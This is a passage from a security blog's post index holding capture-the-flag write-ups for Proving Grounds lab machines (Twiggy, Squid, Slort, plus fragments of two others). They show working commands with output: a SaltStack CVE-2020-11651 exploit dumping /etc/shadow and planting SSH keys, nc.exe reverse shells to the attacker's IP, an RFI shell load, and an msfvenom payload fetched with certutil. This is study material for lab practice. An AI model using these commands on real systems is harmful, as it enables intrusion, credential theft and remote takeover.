inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:94:d7:23 brd ff:ff:ff:ff:ff:ff altname enp3s0 altname ens160 inet 10.10.11.18/23 brd 10.10.11.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:fe94:d723/64 scope global dynamic mngtmpaddr valid_lft 86395sec preferred_lft 14395sec inet6 fe80::250:56ff:fe94:d723/64 scope link valid_lft forever preferred_lft foreverroot@usage:~# ```{: .nolineno}```bashroot@usage:~# whoami && id && hostname && cat root.txt && ifconfig```{: .nolineno}![Image](Pasted%20image%2020240812224556.png)> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Twiggy", "url": "/posts/Twiggy/", "categories": "Proving Grounds, Practice", "tags": "Public Exploit, ZeroMQ_ZMTP_2_0, ssh-keygen", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Twiggy]â””â”€$ sudo nmap -sC -sV -T4 -vv -p- -oN Nmap_Results.txt 192.168.228.62Nmap scan report for 192.168.228.62Host...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Twiggy]â””â”€$ sudo nmap -sC -sV -T4 -vv -p- -oN Nmap_Results.txt 192.168.228.62Nmap scan report for 192.168.228.62Host is up, received echo-reply ttl 61 (0.093s latency).Scanned at 2024-06-10 12:32:02 IST for 185sNot shown: 65529 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZz8rKSxgnT5mqHeBPqGlXFj2JJdq21roV/2M8/+0F5/5D1XsaXmbktDpKILFdBcYnLtPxWstxPq+FTbWAJad2uk3BPYWRxidK2dOozE5rKLCyxtkEqs/lO09pM6VKQUi83y5wMwI+9Akkir0AMruuFUSpeCIBt/L98g8OYxzyTsylQATnPxJrrQOWGUQYAvX6jIs25n6d3rmbXk/crg1ZfAVFEHEeR9Y6Bjc2o5YWjMp3XbOZyC4yYseoM6eH2yCSDwu1DzPYrU6cNMfxBf863w1uyhiFk3eIb5jud3kfoxIq6t5JU2DXNhEd4rdXuuinZUSxWiCpHLZ1FCi4tkX5| 256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA1gj1q7mOswnou9RvKwuX8S7WFBhz2NlaSIpYPQmM0I/vqb4T459PgJcMaJOE+WmPiMnDSFsyV3C6YszM754Hc=| 256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBzTSyInONbcDxdYULbDvI/HyrQm9m9M5b6Z825jnBEF53/tcp open domain syn-ack ttl 61 NLnet Labs NSD80/tcp open http syn-ack ttl 61 nginx 1.16.1|_http-server-header: nginx/1.16.1|_http-title: Home | Mezzanine|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17| http-methods: |_ Supported Methods: GET HEAD OPTIONS4505/tcp open zmtp syn-ack ttl 61 ZeroMQ ZMTP 2.04506/tcp open zmtp syn-ack ttl 61 ZeroMQ ZMTP 2.08000/tcp open http syn-ack ttl 61 nginx 1.16.1|_http-open-proxy: Proxy might be redirecting requests|_http-title: Site doesnt have a title (application/json).|_http-server-header: nginx/1.16.1| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this nginx static page but I got curious about port 4505 and 4506 so I did some enumeration in those ports and look what I found ðŸ”»### Exploit Usage â¤µï¸Looking at port 4505 , 4506 .It looks suspicious so found this exploit online ðŸ”»https://github.com/jasperla/CVE-2020-11651-poc/tree/master```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Twiggy]â””â”€$ python3 exploit.py --master 192.168.190.62 -r /etc/shadow[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort./home/kali/.local/lib/python3.11/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead. warn_until([+] Checking salt-master (192.168.190.62:4506) status... ONLINE[+] Checking if vulnerable to CVE-2020-11651... YES[*] root key obtained: lUqzW0VTcy0NHjDD/Ryg28cRApJ2B37tUUmtmqo4ulfpAfprq1sWcuM2WmONtjORNlPgLeCRTVo=[+] Attemping to read /etc/shadow from 192.168.190.62root:$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/:18400:0:99999:7:::bin:*:17834:0:99999:7:::daemon:*:17834:0:99999:7:::adm:*:17834:0:99999:7:::lp:*:17834:0:99999:7:::sync:*:17834:0:99999:7:::shutdown:*:17834:0:99999:7:::halt:*:17834:0:99999:7:::mail:*:17834:0:99999:7:::operator:*:17834:0:99999:7:::games:*:17834:0:99999:7:::ftp:*:17834:0:99999:7:::nobody:*:17834:0:99999:7:::systemd-network:!!:18400::::::dbus:!!:18400::::::polkitd:!!:18400::::::sshd:!!:18400::::::postfix:!!:18400::::::chrony:!!:18400::::::mezz:!!:18400::::::nginx:!!:18400::::::named:!!:18400::::::```{: .nolineno}I got LFI on this so lets use this exploit to upload our authorized_keys to victim machine to make a connection with ssh without any credentials.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Practice/Twiggy]â””â”€$ python3 exploit.py --master 192.168.190.62 --upload-src /home/kali/.ssh/id_ed25519.pub --upload-dest ../../../../../../../root/.ssh/authorized_keys[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort./home/kali/.local/lib/python3.11/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead. warn_until([+] Checking salt-master (192.168.190.62:4506) status... ONLINE[+] Checking if vulnerable to CVE-2020-11651... YES[*] root key obtained: lUqzW0VTcy0NHjDD/Ryg28cRApJ2B37tUUmtmqo4ulfpAfprq1sWcuM2WmONtjORNlPgLeCRTVo=[+] Attemping to upload /home/kali/.ssh/id_ed25519.pub to ../../../../../../../root/.ssh/authorized_keys on 192.168.190.62[ ] Wrote data to file /srv/salt/../../../../../../../root/.ssh/authorized_keys```{: .nolineno}I generated my SSH keys though this `ssh-keygen` command.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ ssh-keygen Generating public/private ed25519 key pair.Enter file in which to save the key (/home/kali/.ssh/id_ed25519): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kali/.ssh/id_ed25519Your public key has been saved in /home/kali/.ssh/id_ed25519.pubThe key fingerprint is:SHA256:ZsLjB3ZjIcGAxrqAkzXbFjDU+Ed53qNTXJJlnT2AkSk kali@kaliThe keys randomart image is:+--[ED25519 256]--+| o+=.o.. +Bo.o || B.o +..Eo=. o..||.= = o.o.o.o .||* . +.....= ||.o . .* So . ||. o Oo. || . .. || . || |+----[SHA256]-----+â””â”€$ cd .ssh/â”Œâ”€â”€(kaliã‰¿kali)-[~/.ssh]â””â”€$ lsauthorized_keys config id_ed25519 id_ed25519.pub known_hosts known_hosts.oldâ”Œâ”€â”€(kaliã‰¿kali)-[~/.ssh]â””â”€$ pwd /home/kali/.sshâ”Œâ”€â”€(kaliã‰¿kali)-[~/.ssh]â””â”€$ lsauthorized_keys config id_ed25519 id_ed25519.pub known_hosts known_hosts.oldâ”Œâ”€â”€(kaliã‰¿kali)-[~/.ssh]â””â”€$ chmod 600 id_ed25519.pub â””â”€$ chmod 600 id_ed25519 â”Œâ”€â”€(kaliã‰¿kali)-[~/.ssh]â””â”€$ ssh -i id_ed25519 root@192.168.190.62The authenticity of host '192.168.190.62 (192.168.190.62)' cant be established.ED25519 key fingerprint is SHA256:uYMZFN9vYkxFeoZ23/Znor6lCrABMH4HLFk4qNAIkB4.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '192.168.190.62' (ED25519) to the list of known hosts.[root@twiggy ~]# whoamiroot[root@twiggy ~]# pwd/root[root@twiggy ~]# ls -altotal 24dr-xr-x---. 4 root root 153 Jun 10 12:40 .dr-xr-xr-x. 17 root root 244 May 18 2020 ..-rw-r--r--. 1 root root 0 Jul 27 2020 .bash_history-rw-r--r--. 1 root root 18 Dec 28 2013 .bash_logout-rw-r--r--. 1 root root 176 Dec 28 2013 .bash_profile-rw-r--r--. 1 root root 176 Dec 28 2013 .bashrc-rw-r--r--. 1 root root 100 Dec 28 2013 .cshrcdrwxr-----. 3 root root 19 May 18 2020 .pki-rw-r--r-- 1 root root 33 Jun 10 12:19 proof.txtdrwxr-xr-x 2 root root 29 Jun 10 12:40 .ssh-rw-r--r--. 1 root root 129 Dec 28 2013 .tcshrc[root@twiggy ~]# cat proof.txtb63d0adb7cae71da9a407c32f0d7dc21[root@twiggy ~]#```{: .nolineno}I got directly the root shell !> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Squid", "url": "/posts/Squid/", "categories": "Proving Grounds, Practice", "tags": "Squid, spose, RFI, PrivEsc, default_creds", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Squid]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.156.189Nmap scan report for 192.168.156.18...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Squid]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.156.189Nmap scan report for 192.168.156.189Host is up, received user-set (0.10s latency).Scanned at 2024-06-21 21:28:43 IST for 250sNot shown: 65529 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn445/tcp open microsoft-ds? syn-ack ttl 1253128/tcp open http-proxy syn-ack ttl 125 Squid http proxy 4.14|_http-server-header: squid/4.14|_http-title: ERROR: The requested URL could not be retrieved49666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-06-21T16:02:15|_ start_date: N/A| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 54801/tcp): CLEAN (Timeout)| Check 2 (port 30810/tcp): CLEAN (Timeout)| Check 3 (port 12856/udp): CLEAN (Timeout)| Check 4 (port 29016/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_clock-skew: 0s```{: .nolineno}## Squid Enumeration â¤µï¸This Squid http proxy allows us to access the connection on different port using certain Tool like `spose.py` and `Burpsuite`.For further Information I used [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid).```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/â€¦/Proving_Ground/Practice/Squid/spose]â””â”€$ python3 spose.py --proxy http://192.168.156.189:3128 --target 192.168.156.189Using proxy address http://192.168.156.189:3128192.168.156.189 3306 seems OPEN 192.168.156.189 8080 seems OPEN ```{: .nolineno}As I ran `spose.py` Tool It gave me redirect port but to access that I need to setup the proxy from `burpsuite` as port 3128.![Image](Pasted%20image%2020240621214633.png)So I accessed http://192.168.156.189:8080 and got access to a Wampserver page.![Image](Pasted%20image%2020240621214721.png)Now I also got phpmyadmin on this machine I login in it with default creds and checked for any SQL command execution.![Image](Pasted%20image%2020240621214850.png)I also got to know the file system at which this site is hosted upon from `phpinfo.php` page.![Image](Pasted%20image%2020240621220444.png)I used the SQL for RFI and it worked like this ðŸ”»![Image](Pasted%20image%2020240621220511.png)I got command execution now as `nt authority\\system`.![Image](Pasted%20image%2020240621220555.png)Here is how I got the connection made for a stable shell ðŸ”»`192.168.156.189:8080/backdoor.php?cmd=nc.exe%20-e%20cmd.exe%20192.168.45.157%20445`I catch the response on port 445 and I am `nt authority\\system` now ðŸ”»```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Squid]â””â”€$ rlwrap nc -lvnp 445 listening on [any] 445 ...connect to [192.168.45.157] from (UNKNOWN) [192.168.156.189] 49999Microsoft Windows [Version 10.0.17763.2300](c) 2018 Microsoft Corporation. All rights reserved.C:\\wamp\\www>whoamiwhoamint authority\\systemC:\\wamp\\www>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 5C30-DCD7C:.+---3D Objects+---Contacts+---Desktop| proof.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\proof.txttype Desktop\\proof.txtebe9584613557c8c2c915cce5570c6ddC:\\Users\\Administrator>cd ../cd ../C:\\Users>cd ..cd ..C:\\>dirdir Volume in drive C has no label. Volume Serial Number is 5C30-DCD7 Directory of C:\\06/21/2024 08:57 AM 34 local.txt06/21/2024 08:57 AM 2,697 output.txt05/28/2021 04:20 AM PerfLogs05/28/2021 06:06 AM Program Files05/28/2021 03:53 AM Program Files (x86)11/23/2021 09:48 AM Squid05/28/2021 03:53 AM Users11/23/2021 01:05 PM wamp11/19/2021 12:12 AM Windows05/28/2021 06:04 AM Windows10Upgrade 2 File(s) 2,731 bytes 8 Dir(s) 8,782,487,552 bytes freeC:\\>type local.txttype local.txtade423e4b0f6672bc92c319e93de8e66C:\\>```{: .nolineno}I am `nt authority\\system` Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Slort", "url": "/posts/Slort/", "categories": "Proving Grounds, Practice", "tags": "Windows, LFI, RFI, PrivEsc", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Slort]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.236.53Warning: 192.168.236.53 giving up on...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Slort]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.236.53Warning: 192.168.236.53 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.236.53Host is up, received user-set (0.098s latency).Scanned at 2024-07-09 09:51:44 IST for 801sNot shown: 65467 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 125 FileZilla ftpd 0.9.41 beta| ftp-syst: |_ SYST: UNIX emulated by FileZilla135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn445/tcp open microsoft-ds? syn-ack ttl 1251011/tcp filtered unknown no-response1492/tcp filtered stone-design-1 no-response1512/tcp filtered wins no-response2501/tcp filtered rtsclient no-response3306/tcp open mysql? syn-ack ttl 125| fingerprint-strings: | DNSVersionBindReqTCP, LDAPBindReq, LPDString, NULL, SIPOptions: |_ Host '192.168.45.170' is not allowed to connect to this MariaDB server| mysql-info: |_ MySQL Error: Host '192.168.45.170' is not allowed to connect to this MariaDB server3321/tcp filtered vnsstr no-response3860/tcp filtered sasp no-response4443/tcp open http syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD| http-title: Welcome to XAMPP|_Requested resource was http://192.168.236.53:4443/dashboard/|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS4756/tcp filtered RDCenter no-response4847/tcp filtered wfc no-response5040/tcp open unknown syn-ack ttl 1256174/tcp filtered unknown no-response8080/tcp open http syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-title: Welcome to XAMPP|_Requested resource was http://192.168.236.53:8080/dashboard/|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD8151/tcp filtered unknown no-response9179/tcp filtered unknown no-response10086/tcp filtered unknown no-response10574/tcp filtered unknown no-response10746/tcp filtered unknown no-response11301/tcp filtered unknown no-response11501/tcp filtered unknown no-response11994/tcp filtered unknown no-response13315/tcp filtered unknown no-response16183/tcp filtered unknown no-response16428/tcp filtered unknown no-response17721/tcp filtered unknown no-response17849/tcp filtered unknown no-response19967/tcp filtered unknown no-response20276/tcp filtered unknown no-response21563/tcp filtered unknown no-response23886/tcp filtered unknown no-response24672/tcp filtered unknown no-response27094/tcp filtered unknown no-response28797/tcp filtered unknown no-response29938/tcp filtered unknown no-response29949/tcp filtered unknown no-response30827/tcp filtered unknown no-response31757/tcp filtered unknown no-response34428/tcp filtered unknown no-response35763/tcp filtered unknown no-response35807/tcp filtered unknown no-response40028/tcp filtered unknown no-response45239/tcp filtered unknown no-response45380/tcp filtered unknown no-response45638/tcp filtered unknown no-response45925/tcp filtered unknown no-response46094/tcp filtered unknown no-response47960/tcp filtered unknown no-response49664/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49665/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49666/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49668/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC49669/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC53017/tcp filtered unknown no-response56055/tcp filtered unknown no-response56382/tcp filtered unknown no-response57940/tcp filtered unknown no-response58483/tcp filtered unknown no-response59397/tcp filtered unknown no-response59726/tcp filtered unknown no-response60658/tcp filtered unknown no-response63494/tcp filtered unknown no-response63775/tcp filtered unknown no-response64465/tcp filtered unknown no-response1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.94SVN%I=7%D=7/9%Time=668CBD48%P=x86_64-pc-linux-gnu%r(SF:NULL,4D,\"I\\0\\0\\x01\\xffj\\x04Host\\x20'192\\.168\\.45\\.170'\\x20is\\x20not\\x20SF:allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(DNSVersSF:ionBindReqTCP,4D,\"I\\0\\0\\x01\\xffj\\x04Host\\x20'192\\.168\\.45\\.170'\\x20is\\xSF:20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%SF:r(LPDString,4D,\"I\\0\\0\\x01\\xffj\\x04Host\\x20'192\\.168\\.45\\.170'\\x20is\\x20SF:not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(SF:LDAPBindReq,4D,\"I\\0\\0\\x01\\xffj\\x04Host\\x20'192\\.168\\.45\\.170'\\x20is\\x20SF:not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(SF:SIPOptions,4D,\"I\\0\\0\\x01\\xffj\\x04Host\\x20'192\\.168\\.45\\.170'\\x20is\\x20nSF:ot\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 59942/tcp): CLEAN (Couldn't connect)| Check 2 (port 41675/tcp): CLEAN (Couldn't connect)| Check 3 (port 32812/udp): CLEAN (Timeout)| Check 4 (port 24107/udp): CLEAN (Failed to receive data)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-time: | date: 2024-07-09T04:34:49|_ start_date: N/A|_clock-skew: 0s```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this static page ðŸ”»![Image](Pasted%20image%2020240709101500.png)_Slort site that indicates LFI on page parameter_I did the directory listing with feroxbuster Tool and got this page `/site/` in this ðŸ”»![Image](Pasted%20image%2020240709101414.png)_directory or files bruteforcing or listing_Lets Look into LFI with some payloads like `/windows/win.ini` and I got it working ðŸ”»![Image](Pasted%20image%2020240709101321.png)_LFI on this system_I used this LFI to do RFI like this ðŸ”»`http://192.168.236.53:4443/site/index.php?page=http://192.168.45.170/shell.php&cmd=whoami`![Image](Pasted%20image%2020240709101237.png)_RFI connection made remotely from attacker machine server to victim machine_I got the shell now so lets enumerate further and I got this `TFT.EXE` file in Backup directory.```powershellC:\\Backup>move TFTP.EXE TFTP.EXE.bakmove TFTP.EXE TFTP.EXE.bak 1 file(s) moved.C:\\Backup>dirdir Volume in drive C has no label. Volume Serial Number is 6E11-8C59 Directory of C:\\Backup07/08/2024 09:53 PM .07/08/2024 09:53 PM ..06/12/2020 07:45 AM 11,304 backup.txt06/12/2020 07:45 AM 73 info.txt06/23/2020 07:49 PM 73,802 TFTP.EXE.bak 3 File(s) 85,179 bytes 2 Dir(s) 28,604,915,712 bytes freeC:\\Backup>```{: .nolineno}Lets create a reverse shell and swap with the `TFTP.EXE` file as I have permission to do so ðŸ”»```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Slort]â””â”€$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=443 -f exe -o TFTP.EXE[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of exe file: 73802 bytesSaved as: TFTP.EXE```{: .nolineno}Lets transfer it and check how it is running ðŸ”»```powershellC:\\Backup>certutil.exe -f -urlcache http://192.168.45.170/TFTP.EXE TFTP.EXEcertutil.exe -f -urlcache http://192.168.45.170/TFTP.EXE TFTP.EXE**** Online ****CertUtil: -URLCache command completed successfully.C:\\Backup>dirdir Volume in drive C has no label. Volume Serial Number is 6E11-8C59 Directory of C:\\Backup07/08/2024 09:54 PM .07/08/2024 09:54 PM ..06/12/2020 07:45 AM 11,304 backup.txt06/12/2020 07:45 AM 73 info.txt07/08/2024 09:54 PM 460 TFTP.EXE06/23/2020 07:49 PM 73,802 TFTP.EXE.bak 4 File(s) 85,639 bytes 2 Dir(s) 28,604,620,800 bytes freeC:\\Backup>type info\ttype info\tThe system cannot find the file specified.C:\\Backup>type info.txttype info.txtRun every 5 minutes:C:\\Backup\\TFTP.EXE -i 192.168.234.57 get backup.txtC:\\Backup>```{: .nolineno}Lets wait for 5 minutes or so to let it run again so that it triggers my reverse shell executable file ðŸ”»```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Slort]â””â”€$ rlwrap nc -lvnp 443listening on [any] 443 ...connect to [192.168.45.170] from (UNKNOWN) [192.168.236.53] 51199Microsoft Windows [Version 10.0.19042.1387](c) Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32>whoamiwhoamislort\\administratorC:\\WINDOWS\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 0280DF08 6E11:8C59C:.+---3D Objects+---Contacts+---Desktop| | proof.txt| | | \\---PG+---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---OneDrive+---Pictures| +---Camera Roll| \\---Saved Pictures+---Saved Games+---Searches| winrt--{S-1-5-21-2032240294-1210393520-1520670448-500}-.searchconnector-ms| \\---Videos \\---CapturesC:\\Users\\Administrator>type Desktop\\proof.txttype Desktop\\proof.txt9a5d1637a2b8c7a0f1360a762af1648cC:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Resourced", "url": "/posts/Resourced/", "categories": "Proving Grounds, Practice", "tags": "Active Directory, RCBD, GenericAll, BloodHound, enum4linux, SMB, secretsdump, PrivEsc, ticketconverter, s4u, Rubeus", "date": "2024-09-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.198.175PORT STATE SERVICE R...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Proving_Ground/Practice/Resourced]â””â”€$ sudo nmap -sC -sV -p- -vv -T4 -oN Nmap_Results.txt -Pn 192.168.198.175PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 125 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-06-20 07:18:25Z)135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack ttl 125464/tcp open kpasswd5? syn-ack ttl 125593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack ttl 1253268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack ttl 1253389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services|_ssl-date: 2024-06-20T07:19:57+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=ResourceDC.resourced.local| Issuer: commonName=ResourceDC.resourced.local| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2024-03-21T10:42:07| Not valid after: 2024-09-20T10:42:07| MD5: 7643:1b81:d78e:cfa6:c007:754d:83ef:11ca| SHA-1: 0c70:08f9:df37:ff1c:4682:7898:173d:220b:a891:b040| -----BEGIN CERTIFICATE-----| MIIC+DCCAeCgAwIBAgIQWODT06i3879ClVY4aBNFTTANBgkqhkiG9w0BAQsFADAl| MSMwIQYDVQQDExpSZXNvdXJjZURDLnJlc291cmNlZC5sb2NhbDAeFw0yNDAzMjEx| MDQyMDdaFw0yNDA5MjAxMDQyMDdaMCUxIzAhBgNVBAMTGlJlc291cmNlREMucmVz| b3VyY2VkLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwQUs| A4/zvP7ZCbyteV9VLi3sT4ZVyDVZp+6FsmpAP7tYeho867ohS8uZlZtIHJL+oxKj| myWoahVdZVPF49vOYk19URrJDqBYGAtJjSuDDNp+qB7L+XV3XBMCAV3LI3Qhd+st| WYLg+0b7PFIFt7t0u8MwaDPziM5j54pz1qPji6QowHFJu10xlwSzIUYBHQZOtbit| 323r9i9L4hctE40EBsR9+On1u8pvcDiwRLwQyLIPkQsimcnc7ifm0ABsdf8pR9wh| b+7eWNvMpEIJvby6WdKrJy/+NpovyKmqQUbcqm6UcsDffTHM+gT/b3Lc+N1UVyQG| 7kVZ2RLiVR3jdXtL5QIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNV| HQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABCDhPDzqxvxG6tqnE2d1JgwtqMl| bcMHqfZKZs8EJWgkdMfwWOm0AUJHtpJKppYFgKx8F+j0bMqI0fK87Zz3uEgtK2Kg| Ig/lKctyEDOj9BX7ErpY8IXooLjwYOl802mR9MtPR0BIcEqEFKUfxhunoZ4C7RDn| CxDhHaap5fBhHyyiTZCLxKN7m8Mkc/FVLSyz3QJvBM3maK0BeYBU1SgKjHvLETmS| xt+yQpRQ4SWRgvdw12TbPg7y3Fn50IDzdljfw9AqGVJkiZuySYt4YtXIJrdvj4gF| veeq2ip2EFbDFN3lj/P3Rb+3ePuKAYkIqnAMKZM7SbCaxCX1dAMB0xhiMEw=|_-----END CERTIFICATE-----| rdp-ntlm-info: | Target_Name: resourced| NetBIOS_Domain_Name: resourced| NetBIOS_Computer_Name: RESOURCEDC| DNS_Domain_Name: resourced.local| DNS_Computer_Name: ResourceDC.resourced.local| DNS_Tree_Name: resourced.local| Product_Version: 10.0.17763|_ System_Time: 2024-06-20T07:19:17+00:005985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI 